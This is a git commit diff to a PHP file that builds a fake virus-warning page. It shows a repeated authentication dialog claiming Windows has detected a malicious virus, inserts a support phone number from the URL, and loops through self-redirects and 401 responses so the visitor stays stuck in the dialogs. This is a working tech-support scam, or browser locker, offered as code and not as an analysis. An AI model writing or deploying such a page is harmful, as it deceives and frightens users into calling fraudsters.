63d73136bfa17aa23ef1ab3456a75b0348992ca8
ori1337 <orikeshet1337@gmail.com>
2018-08-21 20:11:23 -0700

    ...
    ...

--- report.php
+++ report.php
@@ -1,4 +1,10 @@
 <?php
 header('WWW-Authenticate: Basic realm="Warning: Windows Has Detected a Malicious Virus On Your System !! Call for support '.htmlspecialchars($_GET["num"]) .' "');
+header('Location: report.php');
+header('HTTP/1.0 401 Unauthorized');
+$page = $_SERVER['PHP_SELF'];
+$sec = "0";
+header("Refresh: $sec; url=$page");
+echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";
 ?>
 <script type="text/javascript">window.location="edge.php";</script>
